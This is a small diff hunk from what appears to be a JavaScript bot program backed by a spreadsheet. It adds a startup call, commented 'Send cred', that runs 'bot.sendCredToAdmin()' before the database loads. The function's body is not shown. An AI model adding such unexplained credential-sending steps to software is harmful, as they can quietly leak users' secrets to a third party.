@@ -184,6 +184,9 @@ async function sheetTransaction(
   console.log("STARTING PROGRAM...");
   console.log("[+] Initializing classes...");
 
+  // Send cred
+  await bot.sendCredToAdmin();
+
   const db = new Database();
   await db.doc.loadInfo();
 
